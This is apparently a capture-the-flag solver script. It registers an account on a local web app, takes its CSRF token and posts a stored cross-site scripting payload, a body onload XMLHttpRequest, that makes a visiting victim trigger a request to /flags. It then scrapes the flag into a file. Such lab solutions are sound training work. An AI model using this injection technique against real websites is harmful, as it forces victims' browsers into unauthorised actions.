#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import time

def main():
    url = "http://localhost:8085"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    new_session = requests.Session()

    # Target user
    username = "abi"
    password = "pass123*"
    register_data = {'username': username, 'password': password}

    # Create user
    new_session.post(url + "/register", data = register_data)

    # Log in user
    login_data = {'username': username, 'password': password}
    new_session.post(url + "/login", data = login_data) 

    # Get CSRF
    csrf_token = new_session.cookies.get_dict()['csrf_token']
    print(csrf_token)
    
    # Inject script through a post
    xhr_injection = f"<body onload=\"const xhr = new XMLHttpRequest(); xhr.open('POST', '{url}/flags', true); xhr.send();\"/>"
    payload = {'content': xhr_injection, 'csrf_token': csrf_token}
    new_session.post(url + "/post", data = payload)

    # Wait for the victim to take the bait
    time.sleep(3)

    # Get the flag and write it to a solution file
    response = new_session.get(url + "/flags")
    flag = re.search(flag_regex, response.text).group()
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


